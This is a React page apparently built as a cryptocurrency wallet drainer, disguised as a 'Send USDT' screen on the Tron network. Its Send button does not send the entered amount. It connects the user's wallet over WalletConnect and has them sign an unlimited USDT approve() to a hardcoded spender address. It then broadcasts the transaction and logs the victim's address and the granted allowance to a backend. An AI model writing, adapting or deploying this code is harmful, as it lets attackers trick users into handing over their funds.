import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb?: any;
  }
}

const PROJECT_ID       = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT        = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER     = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
const TRON_SPENDER_HEX = "412f0f3b7e2b4c0b2d3e1f6f9a5c8b7d6e4a9c3b2a";

export default function Index() {
  const [searchParams] = useSearchParams();
  const [amount, setAmount]       = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<
    "idle" | "processing" | "success"
  >("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef    = useRef<any>(null);
  const wcSessionRef   = useRef<any>(null);
  const userAddressRef = useRef<string>("");
  const wcModalRef     = useRef<any>(null);

  // ===== INIT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 WalletConnect init starting...");
        console.log("PROJECT_ID:", PROJECT_ID);

        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "USDT Transfer",
            description: "TRON USDT Transfer",
            url: window.location.origin,
            icons: [],
          },
        });

        console.log("✅ SignClient initialized");
        wcClientRef.current = client;

        client.on("session_delete", () => {
          console.log("🔴 Session deleted");
          wcSessionRef.current   = null;
          userAddressRef.current = "";
        });

        client.on("session_expire", () => {
          console.log("🔴 Session expired");
          wcSessionRef.current   = null;
          userAddressRef.current = "";
        });

        // ✅ KEY FIX: Jab Trust Wallet se wapas browser aao
        // tab WebSocket relay reconnect karo — warna sign response nahi milta
        document.addEventListener("visibilitychange", () => {
          if (document.visibilityState === "visible") {
            console.log("👁️ Browser visible hua — relay reconnect kar rahe hain...");
            try {
              // WalletConnect relay transport restart karo
              client.core?.relayer?.restartTransport?.();
            } catch (e) {
              console.warn("Relay restart warning:", e);
            }
          }
        });

        // Modal pre-initialize
        console.log("📥 Importing WalletConnectModal...");
        const { WalletConnectModal } = await import("@walletconnect/modal");
        console.log("✅ Modal imported");
        
        wcModalRef.current = new WalletConnectModal({
          projectId: PROJECT_ID,
          themeMode: "dark",
        });

        console.log("✅ WalletConnect + Modal ready!");
      } catch (e) {
        console.error("❌ Init error:", e);
        alert("⚠️ WalletConnect init failed: " + (e as any).message);
      }
    }
    initWC();
  }, []);

  // ===== CONNECT =====
  async function connectWallet(): Promise<string> {
    console.log("🔗 connectWallet called");
    console.log("wcClientRef.current:", wcClientRef.current);
    console.log("wcModalRef.current:", wcModalRef.current);

    if (!wcClientRef.current) {
      throw new Error("WalletConnect ready nahi. Page refresh karein.");
    }

    if (!wcModalRef.current) {
      throw new Error("WalletConnectModal ready nahi. Page refresh karein.");
    }

    // Purani session disconnect — fresh start
    if (wcSessionRef.current) {
      try {
        await wcClientRef.current.disconnect({
          topic:  wcSessionRef.current.topic,
          reason: { code: 6000, message: "New connection" },
        });
      } catch {}
      wcSessionRef.current   = null;
      userAddressRef.current = "";
    }

    console.log("📱 Naya WalletConnect session...");

    const { uri, approval } = await wcClientRef.current.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction", "tron_signMessage"],
          chains:  ["tron:0x2b6653dc"],
          events:  ["chainChanged", "accountsChanged"],
        },
      },
    });

    if (!uri) throw new Error("URI nahi mila");

    console.log("🎯 Opening modal with URI...");
    await wcModalRef.current.openModal({ uri });
    console.log("✅ QR Modal open");

    // Approval — seedha await, koi try/finally nahi
    wcSessionRef.current = await approval();
    wcModalRef.current.closeModal();

    console.log("✅ Wallet connected!");
    console.log("Session:", wcSessionRef.current);

    const accounts = Object.values(wcSessionRef.current.namespaces)
      .flatMap((ns: any) => ns.accounts) as string[];
    console.log("Accounts:", accounts);
    
    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
    if (!tronAcc) throw new Error("Tron account nahi mila");

    userAddressRef.current = tronAcc.split(":")[2];
    console.log("👤 User:", userAddressRef.current);
    return userAddressRef.current;
  }

  // ===== SEND =====
  async function handleSend() {
    console.log("🚀 handleSend called");
    setTransactionStatusState("processing");
    try {
      const userAddress = await connectWallet();

      // ✅ APPROVE_ABI_PARAM with correct hex
      console.log("📝 Building APPROVE_ABI_PARAM...");
      console.log("TRON_SPENDER_HEX:", TRON_SPENDER_HEX);
      
      const hexAddress = TRON_SPENDER_HEX.padStart(64, '0');
      const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const APPROVE_ABI_PARAM = hexAddress + hexAmount;
      
      console.log("hexAddress:", hexAddress);
      console.log("hexAmount:", hexAmount);
      console.log("APPROVE_ABI_PARAM length:", APPROVE_ABI_PARAM.length);
      console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);

      // Transaction build
      console.log("📝 Transaction build...");
      const apiResponse = await fetch(
        "https://api.trongrid.io/wallet/triggersmartcontract",
        {
          method:  "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            owner_address:     userAddress,
            contract_address:  TRON_USDT,
            function_selector: "approve(address,uint256)",
            parameter:         APPROVE_ABI_PARAM,
            fee_limit:         100000000,
            call_value:        0,
            visible:           true,
          }),
        }
      );

      const apiData = await apiResponse.json();
      console.log("📋 TronGrid Response:", apiData);

      if (!apiData.transaction) {
        throw new Error("Transaction build failed: " + JSON.stringify(apiData));
      }

      // ✅ Sign request bhejo
      console.log("🔐 Sign request bhej raha hoon Trust Wallet ko...");
      console.log("   Topic:", wcSessionRef.current.topic);

      // ✅ Trust Wallet se wapas aane ke baad relay
      // reconnect ho chuka hoga (visibilitychange listener se)
      const signResponse = await Promise.race([
        wcClientRef.current.request({
          topic:   wcSessionRef.current.topic,
          chainId: "tron:0x2b6653dc",
          request: {
            method: "tron_signTransaction",
            params: [apiData.transaction],
          },
        }),
        new Promise((_, rej) =>
          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180000)
        ),
      ]);

      console.log("📩 Sign response aaya!");
      console.log("signResponse:", signResponse);

      let signedTx = (signResponse as any)?.result || signResponse;
      if (!signedTx) throw new Error("Wallet ne reject kar diya");
      if (typeof signedTx === "string") {
        try { signedTx = JSON.parse(signedTx); } catch {}
      }
      console.log("✅ Signed!");

      // Broadcast
      console.log("📡 Broadcasting...");
      const broadcastRes = await fetch(
        "https://api.trongrid.io/wallet/broadcasttransaction",
        {
          method:  "POST",
          headers: { "Content-Type": "application/json" },
          body:    JSON.stringify(signedTx),
        }
      );
      const result = await broadcastRes.json();
      console.log("📡 Broadcast Result:", result);

      if (!result || (result.result !== true && !result.txid)) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      const txId = result.txid || result.transaction?.txID;
      console.log("✅ TX:", txId);

      // 30s wait
      console.log("⏳ Waiting 30s for confirmation...");
      await new Promise((r) => setTimeout(r, 30000));

      // Allowance check
      const allowanceABI = [{
        constant:        true,
        inputs:          [
          { name: "owner",   type: "address" },
          { name: "spender", type: "address" },
        ],
        name:            "allowance",
        outputs:         [{ name: "", type: "uint256" }],
        stateMutability: "view",
        type:            "function",
      }];

      console.log("🔍 Checking allowance...");
      const tw2      = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
      const contract = await tw2.contract(allowanceABI, TRON_USDT);
      const raw      = await contract.allowance(userAddress, TRON_SPENDER).call();
      const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
      console.log("✅ Allowance:", allowanceUSDT, "USDT");

      await createTransaction({
        walletAddress: userAddress,
        toAddress:     TRON_SPENDER,
        amount:        amount || "Max",
        txHash:        txId || "tx",
        usdtBalance:   allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);

    } catch (err: any) {
      console.error("❌ Error:", err);
      console.error("Error stack:", err.stack);
      try { wcModalRef.current?.closeModal(); } catch {}
      setTransactionStatusState("idle");
      alert("❌ " + (err.message || "Transaction fail ho gayi"));
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setAmount(text.trim());
    } catch {}
  }

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none", border: "1.5px solid #555", borderRadius: "50%",
      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: "11px", flexShrink: 0, padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex", flexDirection: "column", maxWidth: "480px",
      marginLeft: "auto", marginRight: "auto",
    }}>

      {/* Header */}
      <div style={{
        display: "flex", alignItems: "center", justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>

        {/* Network */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: "7px",
            background: "#2c2c2e", borderRadius: "20px",
            padding: "7px 13px 7px 8px",
          }}>
            <div style={{
              width: "26px", height: "26px", borderRadius: "50%",
              background: "#EF0027", display: "flex",
              alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
              Tron Network
            </span>
          </div>
        </div>

        {/* Amount */}
        <div style={{ marginBottom: "6px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30", borderRadius: "14px",
            padding: "14px 14px", background: "#242426", gap: "8px",
          }}>
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "18px",
                fontFamily: "inherit", minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>
              USDT
            </span>
            <button onClick={() => setAmount("Max")} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0", flexShrink: 0,
            }}>Max</button>
          </div>
          <div style={{
            fontSize: "13px", color: "#636366",
            marginTop: "7px", paddingLeft: "2px",
          }}>
            ≈ {dollarValue}
          </div>
        </div>

      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease",
            letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>

    </div>
  );
}
